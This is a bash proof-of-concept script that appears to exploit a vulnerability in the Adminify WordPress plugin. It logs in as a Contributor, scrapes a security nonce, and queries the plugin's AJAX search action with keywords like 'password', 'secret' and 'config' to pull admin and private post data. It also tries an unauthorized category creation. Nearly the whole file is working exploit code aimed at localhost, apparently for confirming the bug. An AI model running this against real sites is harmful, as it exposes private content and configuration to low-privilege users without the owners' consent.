#!/usr/bin/env bash

BASE="http://127.0.0.1"
USER="con"  #contributer username 
PASS="con"  #contributer password
COOKIE="con.txt"

echo "[+] Logging in as Contributor: $USER"

curl -s -c "$COOKIE" -b "$COOKIE" \
  -d "log=$USER" \
  -d "pwd=$PASS" \
  -d "wp-submit=Log In" \
  "$BASE/wp-login.php" > /dev/null

echo "[+] Extracting Adminify nonce"

NONCE=$(curl -s -b "$COOKIE" "$BASE/wp-admin/" \
  | grep -oP '"security_nonce":"\K[^"]+' \
  | head -1)

echo "[+] Nonce: ${NONCE:-NONE}"

if [ -z "$NONCE" ]; then
  echo "[-] Could not find Adminify nonce"
  exit 1
fi

echo
echo "[+] Test 1: Search for admin user/plugin info"

curl -s -b "$COOKIE" \
  -X POST "$BASE/wp-admin/admin-ajax.php" \
  -d "action=pxlbsadminify_all_search" \
  -d "security=$NONCE" \
  -d "search=admin" \
  | jq -r '.data.data' | jq .

echo
echo "[+] Test 2: Search for private post titles"

curl -s -b "$COOKIE" \
  -X POST "$BASE/wp-admin/admin-ajax.php" \
  -d "action=pxlbsadminify_all_search" \
  -d "security=$NONCE" \
  -d "search=private" \
  | jq -r '.data.data' | jq .

echo
echo "[+] Test 3: Extra keyword checks"

for q in test password draft secret config "wp config"; do
  echo
  echo "===== search: $q ====="

  curl -s -b "$COOKIE" \
    -X POST "$BASE/wp-admin/admin-ajax.php" \
    -d "action=pxlbsadminify_all_search" \
    -d "security=$NONCE" \
    -d "search=$q" \
    | jq -r '.data.data' | jq .
done

echo
echo "[+] Optional negative test: folder creation should fail"

curl -i -s -b "$COOKIE" \
  -X POST "$BASE/wp-admin/admin-ajax.php" \
  -d "action=pxlbsadminify_folder" \
  -d "_ajax_nonce=$NONCE" \
  -d "route=create_new_folder" \
  -d "post_type=post" \
  -d "post_type_tax=category" \
  -d "new_folder_name=ADMINIFY_CVE_TEST" \
  -d "folder_color_tag=#ff0000"

echo
echo "[+] Checking whether unauthorized category was created"

curl -s -b "$COOKIE" \
  "$BASE/wp-admin/edit-tags.php?taxonomy=category" \
  | grep -i "ADMINIFY_CVE_TEST" || echo "[-] Category not created, expected"

echo
echo "[+] Done"
